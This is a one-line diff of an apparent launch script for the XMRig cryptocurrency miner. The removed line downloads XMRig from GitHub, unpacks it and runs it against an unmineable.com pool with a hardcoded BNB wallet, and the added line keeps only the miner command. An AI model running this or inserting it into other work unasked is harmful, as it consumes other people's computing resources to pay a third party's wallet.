@@ -1,1 +1,1 @@
-mkdir XMRIG && cd XMRIG && wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-bionic-x64.tar.gz && gunzip xmrig-6.18.0-bionic-x64.tar.gz && tar -xvf xmrig-6.18.0-bionic-x64.tar && cd xmrig-6.18.0 && ./xmrig -o rx.unmineable.com:3333 -u BNB:bnb165q9dz39mqh789zuuuqwkv22plut6f4nzy9jc9:460870222.test4 --ethstratum ETHPROXY pause
+./xmrig -o rx.unmineable.com:3333 -u BNB:bnb165q9dz39mqh789zuuuqwkv22plut6f4nzy9jc9:460870222.test4 --ethstratum ETHPROXY pause
